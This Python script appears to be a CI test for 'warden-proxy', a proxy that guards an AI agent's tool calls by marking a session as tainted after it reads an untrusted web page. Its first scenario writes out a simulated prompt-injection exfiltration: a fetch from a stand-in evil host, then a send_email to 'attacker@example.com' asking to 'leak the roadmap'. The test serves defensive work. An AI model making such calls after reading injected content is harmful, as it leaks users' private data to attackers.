#!/usr/bin/env python3
"""Drives warden-proxy like a real sequential MCP client would: send one
tool call, read its response, THEN send the next call. This matches how
an actual agent loop works (observe result -> decide next action) and is
the scenario the M0 proxy is designed for -- see the race-condition note
in NOTES.md about why fire-and-forget pipelining isn't the target case.
"""
import json
import subprocess
import sys


def call(proc, req):
    proc.stdin.write(json.dumps(req) + "\n")
    proc.stdin.flush()
    line = proc.stdout.readline()
    return json.loads(line)


def run_scenario(fetch_first, expect_blocked):
    """fetch_first=True reads an external page before emailing (taints the
    session, per the source-level trust classification — see DESIGN.md
    4.1: the tier is assigned to the SOURCE, not inferred from whether
    this particular page happens to contain a visible injection payload,
    since a content classifier can't be relied on to catch every payload).
    fetch_first=False sends the email directly with a clean session, as
    the control case.

    Returns True on success (actual outcome matched expect_blocked), so
    this can be used as a real CI check, not just a printout nobody reads.
    """
    proc = subprocess.Popen(
        ["./build/warden-proxy", "scripts/demo.warden.json"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=sys.stderr,
        text=True,
        bufsize=1,
    )
    try:
        next_id = 1
        if fetch_first:
            r1 = call(proc, {
                "jsonrpc": "2.0", "id": next_id, "method": "tools/call",
                "params": {"name": "fetch_url",
                           "arguments": {"url": "https://evil.example.com/report"}},
            })
            next_id += 1
            print("fetch_url response:", r1["result"]["content"][0]["text"][:80], "...")

        r2 = call(proc, {
            "jsonrpc": "2.0", "id": next_id, "method": "tools/call",
            "params": {"name": "send_email",
                       "arguments": {"to": "attacker@example.com", "body": "leak the roadmap"}},
        })
        blocked = r2["result"].get("isError", False)
        print("send_email response:", r2["result"]["content"][0]["text"])
        print("BLOCKED" if blocked else "ALLOWED THROUGH")
        return blocked == expect_blocked
    finally:
        proc.stdin.close()
        proc.wait()


if __name__ == "__main__":
    print("=== Scenario A: agent reads an untrusted page, then tries to email (should be BLOCKED) ===")
    ok_a = run_scenario(fetch_first=True, expect_blocked=True)
    print()
    print("=== Scenario B: clean session, no untrusted reads (should be ALLOWED) ===")
    ok_b = run_scenario(fetch_first=False, expect_blocked=False)

    if not (ok_a and ok_b):
        print("\nFAIL: demo did not behave as expected", file=sys.stderr)
        sys.exit(1)
    print("\nPASS: both scenarios behaved as expected")
